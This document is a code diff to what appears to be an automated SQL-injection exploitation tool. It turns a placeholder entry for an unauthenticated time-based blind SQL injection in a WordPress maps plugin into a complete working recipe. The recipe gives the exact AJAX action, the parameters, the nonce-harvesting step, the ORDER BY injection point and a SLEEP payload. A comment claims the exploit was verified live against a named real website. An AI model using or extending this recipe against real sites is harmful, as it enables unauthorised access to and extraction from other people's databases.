@@ -319,27 +319,40 @@ SQLI_RECIPES = [
         "cve": "CVE-2026-2580",
         "affected": "<=4.9.1",
         "kind": "time-blind",
-        "method": "GET",
+        "method": "POST",
         "endpoint": "/wp-admin/admin-ajax.php",
-        # Sink CONFIRMED from source (core/class.tabular.php::prepare_items):
-        #     $orderby = $_GET['orderby'] ?: $this->primary_col;
-        #     $order   = $_GET['order']   ?: 'asc';
-        #     $query  .= " order by {$orderby} {$order}";   // BOTH interpolated raw
-        # So 'orderby' AND 'order' are injectable ORDER BY-context params (GET).
-        # The vulnerable *frontend* trigger lives in the 4.9.x DataTables listing,
-        # which isn't in the public wp.org mirror — the exact nopriv action must
-        # come from the installed 4.9.x copy:
-        #     grep -rn "wp_ajax_nopriv" wp-content/plugins/wp-google-map-plugin/
-        # Replace the placeholder action below with what that prints.
-        "params": {"action": "CONFIRM_nopriv_listing_action"},
+        # LIVE-VERIFIED end-to-end (askgeorgeai.com, WP MAPS 4.9.1): a clean
+        # +5s delta on SLEEP(5) vs control, and CASE WHEN (1=1/1=2) discriminates.
+        #
+        # Full unauth chain, all read from the installed 4.9.1 source:
+        #   admin-ajax action wpgmp_ajax_call (registered nopriv) runs
+        #   check_ajax_referer('fc-call-nonce','nonce') then $this->$operation($_POST).
+        #   operation=wpgmp_processor reads $_GET['page']=wpgmp_manage_map, builds
+        #   WPGMP_Maps_Table, whose constructor calls init_listing()->prepare_items()
+        #   BEFORE any auth check. There:
+        #       $orderby = sanitize_text_field($_GET['orderby']);  // keeps ( ) , etc.
+        #       $query  .= " order by {$orderby} {$order}";        // raw, no prepare
+        # So the request is a POST (the ajax dispatch) whose ORDER BY sink reads
+        # $_GET — hence method POST but inject_in 'params'. The fc-call-nonce is
+        # localized into the frontend map object as `nonce` (harvested from '/').
+        #
+        # NOTE the sink runs inside `SELECT * FROM wp_create_map ORDER BY <inj>`, so
+        # the injection only times out when the maps table has >=1 row — true on any
+        # real WP MAPS deployment (a site with no maps isn't using the plugin).
+        "params": {"page": "wpgmp_manage_map", "order": "asc"},
+        "data": {"action": "wpgmp_ajax_call", "operation": "wpgmp_processor"},
         "inject_param": "orderby",       # 'order' is a second raw sink (fallback)
-        "payload": "title,(SELECT CASE WHEN ({cond}) THEN SLEEP({sleep}) ELSE 0 END)",
+        "inject_in": "params",           # $_GET sink even though the request is POST
+        "nonce_from": {"url": "/", "key": "nonce", "param": "nonce", "into": "data"},
+        "payload": "(SELECT CASE WHEN ({cond}) THEN SLEEP({sleep}) ELSE 0 END)",
         "true_cond": "1=1",
         "false_cond": "1=2",
         "source": "registry",
-        "note": "Unauth time-based blind SQLi; ORDER BY sink confirmed in "
-                "class.tabular.php (orderby+order, GET). Fill the real nopriv "
-                "action from the installed 4.9.x copy.",
+        "note": "Unauth time-based blind SQLi via orderby. nopriv wpgmp_ajax_call "
+                "(fc-call-nonce, harvested as `nonce` off the frontend) dispatches "
+                "operation=wpgmp_processor + page=wpgmp_manage_map into "
+                "prepare_items(), whose raw `order by {orderby}` runs pre-auth. "
+                "Confirmed live: +5s SLEEP delta on WP MAPS 4.9.1.",
     },
 ]
 
